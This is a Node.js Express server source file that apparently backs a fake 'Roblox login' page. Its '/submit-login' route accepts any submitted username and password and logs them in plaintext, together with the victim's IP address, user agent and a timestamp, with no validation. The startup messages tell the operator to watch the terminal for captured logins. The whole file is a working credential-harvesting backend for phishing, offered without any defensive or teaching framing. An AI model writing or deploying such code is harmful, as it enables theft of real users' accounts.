const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// POST route for login submission - LOGS ALWAYS
app.post('/submit-login', (req, res) => {
  try {
    // Debug: Log raw data
    console.log('=== RAW REQUEST ===');
    console.log('Body:', req.body);
    console.log('Body keys:', Object.keys(req.body));
    console.log('Content-Type:', req.get('Content-Type'));
    console.log('==================');
    
    const { username, password } = req.body;
    
    // Always log (no validation block)
    console.log('=== LOGIN CAPTURED ===');
    console.log('Username:', `"${username}"` || '[EMPTY]');
    console.log('Password:', `"${password}"` || '[EMPTY]');
    console.log('IP:', req.ip);
    console.log('User-Agent:', req.get('User-Agent'));
    console.log('Timestamp:', new Date().toISOString());
    console.log('====================\n');
    
    res.json({ success: true, message: 'Login data received' });
  } catch (error) {
    console.error('Error in /submit-login:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
  console.log(`🚀 Roblox login server running on http://localhost:${PORT}`);
  console.log('📱 Test: http://localhost:3000 - submit form, watch this terminal for logs!');
  console.log('🔧 Debug: Raw request data now logged too');
});

